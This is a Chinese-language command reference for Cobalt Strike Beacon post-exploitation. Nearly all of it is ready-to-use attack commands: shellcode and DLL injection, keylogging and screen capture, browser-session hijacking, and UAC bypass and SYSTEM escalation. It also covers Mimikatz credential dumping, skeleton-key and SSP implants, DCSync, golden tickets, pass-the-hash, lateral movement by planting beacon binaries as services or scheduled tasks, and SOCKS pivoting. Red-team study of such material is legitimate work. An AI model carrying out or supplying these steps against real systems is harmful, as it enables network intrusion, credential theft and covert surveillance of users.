# Beacon 命令详解与后渗透技术

本文档是 Cobalt Strike Beacon 的详细操作参考，涵盖 Beacon 控制台命令、文件操作、凭据获取、横向移动、域渗透等后渗透技术。

---

## Beacon 控制台基础

### 进入与管理

```
# 进入 Beacon 控制台
右击会话 → interact

# Beacon 菜单结构
Access    → 凭据操作、提权
Explore   → 信息探测、文件浏览、进程列表、截屏
Pivoting  → 代理隧道、端口转发、Listener
Session   → 会话管理（sleep、退出、备注）
```

### 通信模式控制

```
# 异步模式（默认）
sleep 60          # 每 60 秒回连一次
sleep 60 50       # 60 秒基础，50% 抖动（实际 30-60 秒随机）

# 交互模式
sleep 0           # 即时执行，OPSEC 风险高

# 命令队列管理
clear             # 清除所有待执行命令
```

Beacon 是异步 Payload，命令不会立即执行而是在下次 check in 时一并执行。使用 `desktop` 等命令时会自动进入交互模式。

---

## 命令执行

### 系统命令

```
# 通过 cmd.exe 执行（有回显）
shell ipconfig
shell whoami /groups
shell dir \\target\C$

# 不使用 cmd.exe 执行（有回显）
run ipconfig

# 执行命令但不回显
execute <command>

# 文件系统
cd <path>
pwd
ls
```

### PowerShell 命令

```
# 通过 powershell.exe 执行
powershell Get-Process
powershell Get-Help Get-Process

# 不使用 powershell.exe 执行（更隐蔽）
powerpick Get-Process

# 导入 PowerShell 脚本
powershell-import <script.ps1>
# 注意：一次只能保留一个导入的脚本，导入空文件可清除

# 注入 PowerShell 到特定进程
psinject <pid> <arch> <command>
```

### .NET 程序集执行

```
# 内存加载 .NET 可执行文件
execute-assembly <local_path_to_exe> [arguments]
# 示例：
execute-assembly /tools/Seatbelt.exe -group=all
execute-assembly /tools/SharpHound.exe --CollectionMethod All
```

### 环境变量

```
setenv <name> <value>
```

---

## 文件操作

### 文件浏览器

```
# 图形化文件浏览
右击会话 → Explore → File Browser
# 彩色文件夹 = 已缓存内容
# 灰色文件夹 = 未缓存
```

### 文件下载

```
download <remote_file>          # 下载文件到 TeamServer
downloads                       # 查看当前下载列表
cancel <filename>               # 取消下载（支持通配符）

# 下载的文件保存在 TeamServer
# View → Downloads 查看，选中后 Sync Files 同步到本地
# HTTP/HTTPS 通道每次拉取 512KB 数据块
```

### 文件上传

```
upload <local_file>             # 上传到目标当前目录
timestomp <file_a> <file_b>    # 将 file_a 的时间戳改为与 file_b 一致
```

---

## 进程管理与注入

### 进程操作

```
ps                              # 列出所有进程
kill <pid>                      # 结束进程

# 后台任务管理
jobs                            # 查看当前 Beacon 后台任务
jobkill <job_id>                # 停止指定任务
```

### 进程注入

```
# 注入 shellcode 到进程
inject <pid> <x86|x64> <listener>

# 注入反射性 DLL
dllinject <pid> <local_dll>

# 从本地文件注入 shellcode
shinject <pid> <arch> <shellcode_file>

# 派生进程后注入 shellcode
shspawn <arch> <shellcode_file>

# 加载磁盘上的 DLL 到进程
dllload <pid> <remote_dll_path>
```

### Spawn 控制

```
# 派生新会话
spawn <listener>
spawn <arch> <listener>

# 指定 spawn 使用的进程（默认 rundll32.exe，建议修改）
spawnto x64 %windir%\sysnative\svchost.exe
spawnto x86 %windir%\syswow64\svchost.exe

# 恢复默认 spawnto
spawnto
```

---

## 信息收集

### 屏幕截图

```
screenshot                              # 截取一次屏幕
screenshot <pid>                        # 注入到 x86 进程截图
screenshot <pid> x64                    # 注入到 x64 进程截图
screenshot <pid> <arch> <seconds>       # 持续截图指定秒数

# 查看截图：View → Screenshots
# 推荐注入 explorer.exe（稳定持久）
```

### 键盘记录

```
keylogger                               # 注入临时进程
keylogger <pid>                         # 注入 x86 进程
keylogger <pid> x64                     # 注入 x64 进程

# 查看结果：View → Keystrokes
# 注意：每个桌面会话只用一个键盘记录器，避免冲突
```

### 端口扫描

```
portscan <targets> <ports> <discovery>
# discovery 方法：
#   arp  — ARP 发现（适合同网段）
#   icmp — ICMP 发现
#   none — 假设所有主机存活

# 图形化：右击 → Explore → Port Scan
# 结果：View → Targets；右击 → Services 查看详情
```

### 浏览器转发

```
# 条件：目标正在使用 IE 浏览器
# 右击会话 → Explore → Browser Pivot
# 选择可注入的进程（带对勾标记），设置代理端口
# 本地浏览器配置 HTTP 代理指向 <CS_TeamServer_IP>:<端口>
# 访问目标正在打开的网站即可劫持会话
```

---

## 提权技术

### UAC Bypass

```
# 查看当前权限等级
shell whoami /groups

# 方法一：通过 Elevate 图形界面
右击 → Access → Elevate → 选择 exploit + listener

# 方法二：命令行
elevate <exploit_name> <listener>
# 常用 exploit：
#   uac-token-duplication（Win7 / Win10 2018.11 前）
#   ms14-058（需加载 ElevateKit）

# Bypass UAC 将中级管理员提升为高级管理员
bypassuac
```

### 系统权限

```
# 本地管理员（高权限）→ SYSTEM
getsystem

# 使用其他用户凭据
runas <domain\user> <password> <command>
spawnas <domain\user> <password> <listener>
```

### PowerUp 提权

```
# 导入 PowerUp 脚本
powershell-import PowerUp.ps1

# 执行所有弱点检查
powershell Invoke-AllChecks

# 检查结果中的 AbuseFunction 字段即为可利用的提权命令
# 常见弱点：
#   - 未加引号的服务路径
#   - 可修改的服务可执行文件
#   - DLL 劫持位置
#   - 计划任务弱点
#   - 自动登录凭据
```

---

## 凭据获取

### 本地凭据

```
# 导出 SAM 哈希
hashdump

# Mimikatz 获取明文密码
logonpasswords
# 等同于：mimikatz sekurlsa::logonpasswords

# 查看已获取的凭据
View → Credentials
```

### Mimikatz 高级用法

```
# 基本格式
mimikatz <module::command>          # 当前权限
mimikatz !<module::command>         # 强制 SYSTEM
mimikatz @<module::command>         # 使用当前令牌

# 常用命令
!lsadump::sam                       # 本地 SAM 哈希
!lsadump::cache                     # 缓存凭证（最近 10 个密码哈希）
misc::cmd                           # 重新启用被禁用的 CMD

# SSP 注入（记录后续登录明文密码）
mimikatz !misc::memssp
# 结果：C:\Windows\system32\mimilsa.log
# 等待用户重新登录后查看：
shell type C:\Windows\system32\mimilsa.log

# 万能密码（域内，注入 lsass，重启失效）
mimikatz misc::skeleton
# 之后所有域用户都可用统一密码登录，原密码仍有效

# 进程操作
mimikatz process::suspend <pid>     # 挂起进程
mimikatz process::resume <pid>      # 恢复进程
```

### DCSync 攻击

```
# 远程复制域控数据库中的哈希
# 需要域管理员或等效权限
mimikatz lsadump::dcsync /user:krbtgt
mimikatz lsadump::dcsync /user:Administrator
```

---

## 令牌操作与身份伪装

### 令牌窃取

```
# 1. 列出进程，找到目标用户的进程
ps

# 2. 窃取令牌
steal_token <pid>

# 3. 验证身份
getuid

# 4. 执行操作（此时以目标用户身份）
shell dir \\DC\C$

# 5. 恢复原始令牌
rev2self
```

### 凭据伪造

```
# 已知明文密码
make_token <DOMAIN\user> <password>

# 已知 NTLM 哈希（Pass-the-Hash）
pth <DOMAIN\user> <ntlm_hash>
# 原理：mimikatz 创建进程并填入哈希，CS 自动窃取该进程令牌

# 使用凭据派生会话
spawnas <DOMAIN\user> <password> <listener>

# 建立网络连接
shell net use \\host\C$ /USER:DOMAIN\user password
```

### Kerberos 票据

```
# 查看当前票据
shell klist

# 清除票据
kerberos_ticket_purge

# 加载票据
kerberos_ticket_use <ticket_file>
```

### 黄金票据

```
# 前提条件：
# 1. 目标用户名和域名
# 2. 域 SID（whoami /user，去掉最后一组数字）
# 3. KRBTGT 的 NTLM 哈希（从域控 hashdump 或 dcsync 获取）

# 图形化生成
Access → Golden Ticket → 填写信息 → Build
# Domain 格式必须为 FQDN（如 domain.com）

# 验证
shell dir \\DC\C$
powershell Invoke-Command -computer DC -ScriptBlock {whoami}
```

---

## 横向移动

### 自动化横向命令

```
# 服务执行（落地可执行文件）
psexec <target> <listener>
psexec64 <target> <listener>

# 服务执行 PowerShell（无文件落地）
psexec_psh <target> <listener>

# WinRM 执行
winrm <target> <listener>
winrm64 <target> <listener>

# WMI 执行
wmi <target> <listener>

# 图形化
View → Targets → 右击目标 → Jump → 选择方式和 Listener
```

### 手动横向（方法一：Windows 服务）

```
# 1. 生成 Windows Service EXE（注意是 Service 类型）
# 2. 上传到目标
upload beacon_svc.exe
shell copy beacon_svc.exe \\target\C$\Windows\Temp\

# 3. 创建并启动服务
shell sc \\target create svcname binpath= C:\Windows\Temp\beacon_svc.exe
shell sc \\target start svcname

# 4. 连接 SMB Beacon
link <target>

# 5. 清理
shell sc \\target delete svcname
shell del \\target\C$\Windows\Temp\beacon_svc.exe
```

### 手动横向（方法二：计划任务）

```
# 1. 生成 Windows EXE（非 Service 类型）
# 2. 上传并复制到目标
shell copy beacon.exe \\target\C$\Windows\Temp\

# 3. 查看目标时间
shell net time \\target

# 4. 创建计划任务
shell at \\target HH:mm C:\Windows\Temp\beacon.exe

# 5. 等待执行后连接
link <target>
```

### WinRM 远程命令

```
# 直接执行命令（无需上传文件）
powershell Invoke-Command -ComputerName <target> -ScriptBlock {whoami}

# WinRM 运行 Mimikatz
powershell-import Invoke-Mimikatz.ps1
powershell Invoke-Mimikatz -ComputerName <target>
# 如果文件 >1MB，用 upload 上传后：
powershell import-module C:\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName <target>
```

---

## 域内枚举

### 基础枚举命令

```
# 当前域
net view /domain
shell net view /domain

# 域内主机
net view
shell net view /domain:<domain_name>
shell net group "domain computers" /domain

# 域控制器
net dclist
net dclist <domain>
shell nltest /dclist:<domain>

# 域信任关系
shell nltest /domain_trusts
shell nltest /server:<dc_ip> /domain_trusts

# 主机名解析
shell nslookup <hostname>
shell ping -n 1 -4 <hostname>

# 共享列表
net share \\<hostname>
shell net view \\<hostname>
```

### PowerView 枚举

```
# 导入 PowerView
powershell-import PowerView.ps1

# 域信息
powershell Get-NetDomain

# 共享发现
powershell Invoke-ShareFinder

# 域信任关系
powershell Invoke-MapDomainTrust

# 发现本地管理员访问
powershell Find-LocalAdminAccess

# 查询目标本地管理员
powershell Get-NetLocalGroup -Hostname <target>
```

### 用户枚举

```
# 域管理员
shell net group "enterprise admins" /domain
shell net group "domain admins" /domain
shell net localgroup "administrators" /domain

# 本地管理员（Beacon net 模块）
net localgroup \\<target>
net localgroup \\<target> administrators

# 验证管理员权限
shell dir \\<target>\C$
# 成功 = 管理员；拒绝访问 = 普通用户
```

---

## SOCKS 代理与转发

### SOCKS 代理

```
# 开启（在已上线主机上）
sleep 0                         # 先进入交互模式
socks <port>                    # 开启 SOCKS4a 代理

# 或图形化：右击 → Pivoting → SOCKS Server
# 查看：View → Proxy Pivots

# MSF 使用代理
setg Proxies socks4:<CS_IP>:<port>
setg ReverseAllowProxy true
# 停止：unsetg Proxies

# ProxyChains
# 编辑 /etc/proxychains.conf：
#   socks4 <CS_IP> <port>
# 使用：
proxychains nmap -sT -Pn <target> -p 80,445,3389
proxychains curl <target>

# 关闭
socks stop
```

### 反向端口转发

```
# 用于不出网主机上线
# 1. 右击已上线会话 → Pivoting → Listener
# 2. CS 自动配置，设置名称后保存
# 3. 生成 Payload 选择该 Listener
# 4. 在不出网主机上执行 Payload
# 流量路径：不出网主机 → 已上线主机 → TeamServer
```

---

## 日志与报告

### 日志位置

```
# TeamServer 运行目录下的 logs 文件夹
logs/
├── beacon_<id>.log          # Beacon 会话日志
├── keystrokes/              # 键盘记录
└── screenshots/             # 截图（screen_HHMMSS_ID.jpg）
```

### 报告生成

```
# Reporting 菜单
活动报告 (Activity Report)       → 红队活动时间表
主机报告 (Hosts Report)          → 主机信息、凭据、服务汇总
IOC 报告 (Indicators of Compromise) → C2 特征、域名、文件哈希
会话报告 (Sessions Report)       → 通信路径、活动时间线
社工报告 (Social Engineering)    → 钓鱼邮件统计
TTP 报告 (Tactics, Techniques)   → MITRE ATT&CK 映射

# 输出格式：PDF / Word
# 支持合并多个 TeamServer 报告
```
